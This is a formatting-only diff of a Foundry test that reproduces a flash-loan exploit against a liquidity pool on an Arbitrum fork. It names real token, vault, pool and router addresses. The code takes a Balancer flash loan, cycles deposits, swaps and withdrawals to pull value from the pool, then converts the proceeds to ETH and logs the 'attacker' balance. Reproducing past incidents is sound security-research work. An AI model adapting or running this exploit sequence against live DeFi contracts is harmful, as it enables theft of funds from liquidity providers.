@@ -46,25 +46,17 @@ interface IPool {
 }
 
 contract ContractTest is Test {
-    IERC20 private constant USDT =
-        IERC20(0xFd086bC7CD5C481DCC9C85ebE478A1C0b69FCbb9);
-    IERC20 private constant USDCe =
-        IERC20(0xFF970A61A04b1cA14834A43f5dE4533eBDDB5CC8);
-    IERC20 private constant WETH =
-        IERC20(0x82aF49447D8a07e3bd95BD0d56f35241523fBab1);
-    IERC20 private constant USDT_LP =
-        IERC20(0xCFf307451E52B7385A7538f4cF4A861C7a60192B);
-    IERC20 private constant USDC_LP =
-        IERC20(0x7CC32EE9567b48182E5424a2A782b2aa6cD0B37b);
-    IBalancerVault private constant Vault =
-        IBalancerVault(0xBA12222222228d8Ba445958a75a0704d566BF2C8);
-    IPool private constant Pool =
-        IPool(0x15A024061c151045ba483e9243291Dee6Ee5fD8A);
-    IPancakeRouter private constant SushiRouter =
-        IPancakeRouter(payable(0x1b02dA8Cb0d097eB8D57A175b88c7D8b47997506));
+    IERC20 private constant USDT = IERC20(0xFd086bC7CD5C481DCC9C85ebE478A1C0b69FCbb9);
+    IERC20 private constant USDCe = IERC20(0xFF970A61A04b1cA14834A43f5dE4533eBDDB5CC8);
+    IERC20 private constant WETH = IERC20(0x82aF49447D8a07e3bd95BD0d56f35241523fBab1);
+    IERC20 private constant USDT_LP = IERC20(0xCFf307451E52B7385A7538f4cF4A861C7a60192B);
+    IERC20 private constant USDC_LP = IERC20(0x7CC32EE9567b48182E5424a2A782b2aa6cD0B37b);
+    IBalancerVault private constant Vault = IBalancerVault(0xBA12222222228d8Ba445958a75a0704d566BF2C8);
+    IPool private constant Pool = IPool(0x15A024061c151045ba483e9243291Dee6Ee5fD8A);
+    IPancakeRouter private constant SushiRouter = IPancakeRouter(payable(0x1b02dA8Cb0d097eB8D57A175b88c7D8b47997506));
 
     function setUp() public {
-        vm.createSelectFork("arbitrum", 140129166);
+        vm.createSelectFork("arbitrum", 140_129_166);
         vm.label(address(USDT), "USDT");
         vm.label(address(USDCe), "USDCe");
         vm.label(address(WETH), "WETH");
@@ -91,11 +83,7 @@ contract ContractTest is Test {
         swapTokensSushi(USDT, USDT.balanceOf(address(this)));
         swapTokensSushi(USDCe, USDCe.balanceOf(address(this)));
 
-        emit log_named_decimal_uint(
-            "Attacker ETH balance after exploit",
-            address(this).balance,
-            18
-        );
+        emit log_named_decimal_uint("Attacker ETH balance after exploit", address(this).balance, 18);
     }
 
     function receiveFlashLoan(
@@ -131,14 +119,7 @@ contract ContractTest is Test {
 
             deposit(address(USDT), amountDeposit1);
             deposit(address(USDCe), amountDeposit2 / 3);
-            Pool.swap(
-                address(USDCe),
-                address(USDT),
-                amountSwap1,
-                0,
-                address(this),
-                block.timestamp + 1000
-            );
+            Pool.swap(address(USDCe), address(USDT), amountSwap1, 0, address(this), block.timestamp + 1000);
 
             // Not working logic. I leave this for the future update
             // uint256 liquidity = USDT_LP.balanceOf(address(this));
@@ -152,29 +133,13 @@ contract ContractTest is Test {
 
             withdraw(address(USDT), potentialWithdraws[i]);
 
-            uint256 fromAmountUSDT = (USDT.balanceOf(address(this)) -
-                diffUSDT) * 3;
-            Pool.swap(
-                address(USDT),
-                address(USDCe),
-                fromAmountUSDT >> 2,
-                0,
-                address(this),
-                block.timestamp + 1000
-            );
+            uint256 fromAmountUSDT = (USDT.balanceOf(address(this)) - diffUSDT) * 3;
+            Pool.swap(address(USDT), address(USDCe), fromAmountUSDT >> 2, 0, address(this), block.timestamp + 1000);
 
             withdraw(address(USDT), USDT_LP.balanceOf(address(this)));
 
-            uint256 fromAmountUSDCe = (USDCe.balanceOf(address(this)) -
-                diffUSDCe);
-            Pool.swap(
-                address(USDCe),
-                address(USDT),
-                fromAmountUSDCe >> 1,
-                0,
-                address(this),
-                block.timestamp
-            );
+            uint256 fromAmountUSDCe = (USDCe.balanceOf(address(this)) - diffUSDCe);
+            Pool.swap(address(USDCe), address(USDT), fromAmountUSDCe >> 1, 0, address(this), block.timestamp);
 
             withdraw(address(USDCe), USDC_LP.balanceOf(address(this)));
             ++i;
@@ -188,13 +153,7 @@ contract ContractTest is Test {
     }
 
     function withdraw(address token, uint256 amount) internal {
-        Pool.withdraw(
-            address(token),
-            amount,
-            0,
-            address(this),
-            block.timestamp + 1000
-        );
+        Pool.withdraw(address(token), amount, 0, address(this), block.timestamp + 1000);
     }
 
     function swapTokensSushi(IERC20 token, uint256 amount) internal {
@@ -203,11 +162,7 @@ contract ContractTest is Test {
         path[1] = address(WETH);
 
         SushiRouter.swapExactTokensForETHSupportingFeeOnTransferTokens(
-            amount,
-            0,
-            path,
-            address(this),
-            block.timestamp + 1000
+            amount, 0, path, address(this), block.timestamp + 1000
         );
     }
 
